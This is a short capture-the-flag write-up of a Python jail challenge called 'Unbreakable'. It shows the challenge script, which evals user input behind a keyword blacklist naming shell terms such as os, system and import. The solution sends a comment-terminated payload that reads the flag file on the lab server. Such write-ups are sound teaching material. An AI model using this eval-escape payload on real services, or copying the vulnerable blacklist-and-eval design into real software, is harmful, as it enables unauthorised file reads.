# Unbreakable

# Unbreakable

### Description

Think you can escape my grasp? Challenge accepted! I dare you to try and break free, but beware, it won't be easy. I'm ready for whatever tricks you have up your sleeve!

Challenge:

```py
#!/usr/bin/python3

banner1 = '''<SMILE>'''
banner2 = '''<RABBIT>'''

blacklist = [ ';', '"', 'os', '_', '\\', '/', '`',
              ' ', '-', '!', '[', ']', '*', 'import',
              'eval', 'banner', 'echo', 'cat', '%', 
              '&', '>', '<', '+', '1', '2', '3', '4',
              '5', '6', '7', '8', '9', '0', 'b', 's', 
              'lower', 'upper', 'system', '}', '{' ]

while True:
  ans = input('Break me, shake me!\n\n$ ').strip()
  
  if any(char in ans for char in blacklist):
    print(f'\n{banner1}\nNaughty naughty..\n')
  else:
    try:
      eval(ans + '()')
      print('WHAT WAS THAT?!\n')
    except:
      print(f"\n{banner2}\nI'm UNBREAKABLE!\n") 
```

### Solution

We are given netcat port to connect to which places us in Python Jail. `blacklist` limits what we can do, my initial thought was `breakpoint` but `b` is blocked. Since we know flag to be in current directory we can use `print(open(flag).read())` to get flag contents.

`eval` function adds `()` to our command which can be ignored by comment.

```py
➜ ncat 94.237.62.149 57503
Break me, shake me!

$ print(open('flag.txt').read())#
HTB{3v4l_0r_3vuln??}

WHAT WAS THAT?!

Break me, shake me!
```

> Flag: HTB{3v4l\_0r\_3vuln??}
> \
> {: .prompt-tip}
